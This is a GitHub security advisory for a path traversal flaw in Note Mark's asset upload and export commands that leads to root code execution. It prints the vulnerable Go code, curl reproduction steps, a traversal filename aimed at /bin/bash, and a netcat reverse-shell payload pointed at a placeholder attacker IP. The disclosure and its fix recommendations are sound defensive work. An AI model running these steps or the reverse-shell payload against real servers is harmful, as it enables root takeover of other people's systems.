# [H] Note Mark: Arbitrary File Write via Path Traversal in Asset Names Leads to Remote Code Execution

## Summary
Severity: High
Advisory: GHSA-g49p-4qxj-88v3
CVE: CVE-2026-44522
CWE: CWE-20, CWE-22
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-g49p-4qxj-88v3
Type: github-advisory

## Affected
- Go: `github.com/enchant97/note-mark/backend` — affected >=0 <0.0.0-20260501152243-db3f72bff780

## Details
### Description

The Note Mark application allows authenticated users to upload assets to notes via `POST /api/notes/{noteID}/assets`, where the asset filename is provided through the `X-Name` HTTP request header. This value is stored directly in the database without any sanitization or validation - no path separator filtering, no directory traversal sequence rejection, and no use of `filepath.Base()` to strip directory components. The unsanitized name is persisted as-is in the `note_assets` table (`Name` column, `varchar(80)`).

When an administrator subsequently runs the data export CLI commands (`note-mark migrate export-v1` or `note-mark migrate export`), the stored asset name is passed directly into `filepath.Join()` and `path.Join()` calls as part of the output file path argument to `os.Create()`. Since Go's `filepath.Join()` resolves `../` sequences during path normalization, an attacker-controlled asset name containing directory traversal sequences causes the export process to write files to arbitrary locations on the filesystem, completely outside the intended export directory.

The export process typically runs as root (the default in Docker deployments and common in bare-metal setups). This means the arbitrary file write operates with root privileges, allowing an attacker to write to any writable location on the filesystem. This can be escalated to Remote Code Execution by overwriting system binaries such as `/bin/bash` with a malicious payload. Since the Go binary is statically compiled and does not shell out to external programs during the export, overwriting `/bin/bash` does not affect the running export process. However, the next time any user or administrator invokes `bash` on the system, the attacker-controlled binary executes instead, resulting in code execution as root. In environments with cron or systemd, writing to `/etc/cron.d/` or systemd unit files provides additional exploitation paths.

The data flow is: `X-Name` HTTP header > `handlers/assets.go` (no validation) > `services/assets.go` (stored to DB as-is) > `cli/migrate.go` (used in `os.Create(filepath.Join(..., asset.Name))`) > arbitrary file write.

#### Source Code Analysis

The asset upload handler at `backend/handlers/assets.go:48-51` extracts the filename directly from the `X-Name` header:

```go
type PostNoteAssetInput struct {
    NoteID  uuid.UUID `path:"noteID" format:"uuid"`
    Name    string    `header:"X-Name" required:"true"`
    RawBody []byte    `required:"true"`
}
```

The service layer at `backend/services/assets.go:39-42` stores this value without validation:

```go
noteAsset := db.NoteAsset{
    NoteID: noteID,
    Name:   name,
}
```

The V1 export function at `backend/cli/migrate.go:328` uses the unsanitized name directly:

```go
f, err := os.Create(filepath.Join(noteDir, asset.Name))
```

The non-V1 export function at `backend/cli/migrate.go:223` similarly uses it:

```go
f, err := os.Create(path.Join(assetsDir, asset.ID.String()+"."+asset.Name))
```

In both cases, `filepath.Join` / `path.Join` resolves `../` sequences in `asset.Name`, causing the resulting path to escape the intended directory.


### Steps to Reproduce

1. Start a Note Mark instance (version 0.19.2 or earlier) using the official Docker image: `docker run -d --name notemark -p 8080:8080 -e JWT_SECRET="$(openssl rand -base64 32)" -e PUBLIC_URL="http://localhost:8080" ghcr.io/enchant97/note-mark-aio:0.19.2`

2. Register a user account: `curl -s -X POST http://localhost:8080/api/users -H 'Content-Type: application/json' -d '{"username":"attacker","password":"Attack3r!","name":"attacker"}'`

3. Authenticate and capture the session cookie: `curl -s -D - -X POST http://localhost:8080/api/auth/token -H 'Content-Type: application/json' -d '{"username":"attacker","password":"Attack3r!","grant_type":"password"}'`. Save the `Auth-Session-Token` cookie value from the `Set-Cookie` response header.

4. Create a notebook: `curl -s -X POST http://localhost:8080/api/books -H 'Content-Type: application/json' -b 'Auth-Session-Token=<TOKEN>' -d '{"name":"test","slug":"test"}'`. Note the returned `id` as `BOOK_ID`.

5. Create a note in the notebook: `curl -s -X POST http://localhost:8080/api/books/<BOOK_ID>/notes -H 'Content-Type: application/json' -b 'Auth-Session-Token=<TOKEN>' -d '{"name":"test","slug":"test"}'`. Note the returned `id` as `NOTE_ID`.

6. Upload an asset with a reverse shell payload in the body and a path traversal filename in the `X-Name` header targeting `/bin/bash`: `curl -s -X POST http://localhost:8080/api/notes/<NOTE_ID>/assets -b 'Auth-Session-Token=<TOKEN>' -H 'X-Name: ../../../../../../bin/bash' -H 'Content-Type: application/octet-stream' -d '#!/bin/sh\nnc <ATTACKER_IP> <PORT> -e /bin/sh'`. Confirm the response contains `"name":"../../../../../../bin/bash"`, showing the traversal payload was stored without sanitization.

7. Trigger the export as an administrator (simulating the admin running a routine data export): `docker exec notemark /note-mark migrate export-v1 --export-dir /data/backup`

8. Verify `/bin/bash` was overwritten with the attacker payload: `docker exec notemark cat /bin/bash`. The file should contain the reverse shell script instead of the original bash binary, confirming arbitrary file write.

9. Start a listener on the attacker machine (`nc -lvnp <PORT>`), then invoke bash on the target: `docker exec notemark bash`. A reverse shell connects back to the attacker as root, confirming Remote Code Execution.

#### Proof of Concept (Video) 
[note-mark-path-traversal-rce.webm](https://github.com/user-attachments/assets/6969a00a-3ad1-4e30-b5ce-9e780da4fa2b)


### Recommendations

The root cause is the complete absence of input validation on the `X-Name` header value used as the asset filename. The fix should be applied at two layers.

At the input layer in the asset upload handler, the application should reject any asset name containing path separators (`/`, `\`) or directory traversal sequences (`..`). The simplest approach is to apply `filepath.Base()` to the incoming name, which strips all directory components and returns only the final filename element. Names that resolve to empty strings or `.` after this operation should be rejected. This validation should be applied in the `PostNoteAsset` handler before the name reaches the service layer.

At the export layer in the CLI migration code, the application should apply `filepath.Base()` to `asset.Name` before using it in any file path construction as a defense-in-depth measure. This ensures that even if a malicious name exists in the database (from before the input validation was added), the export process cannot be exploited. Both the V1 export path at `migrate.go:328` and the standard export path at `migrate.go:223` require this fix.


Reported By: Ravindu Wickramasinghe (rvz) - Zyenra Security -  www.zyenra.com

## References
- https://github.com/enchant97/note-mark/security/advisories/GHSA-g49p-4qxj-88v3
- https://nvd.nist.gov/vuln/detail/CVE-2026-44522
- https://github.com/enchant97/note-mark
- https://github.com/enchant97/note-mark/releases/tag/v0.19.4
